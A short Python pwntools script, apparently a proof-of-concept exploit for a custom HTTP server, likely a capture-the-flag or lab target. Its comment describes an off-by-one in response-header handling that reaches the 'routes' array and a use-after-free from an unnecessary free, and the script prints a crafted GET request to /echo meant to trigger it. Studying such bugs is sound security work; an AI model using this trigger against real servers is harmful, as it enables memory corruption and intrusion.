#!/usr/bin/env python3

from pwn import * 

'''
If we got to EXACTLY the length of the amount of headers for a 
response, it creates problems. 

Some of the usage of 'res_headers_lst' only check for NULL and 
NOT the maximum amount. As a result, we can use the pointer AFTER
this to do things. 
In practice, this is the 'routes' array! 

The usage includes an unnecessary free, which creates a UAF on the routes. 
'''
# Line one
string = "GET /echo?req_type=header&key=AAAAAAA&res_type=body HTTP/1.1\r\n"

# Headers
string += "AAAAAAA:BBBBBBB\r\n"
string += "\r\n"

print(string, end='')  
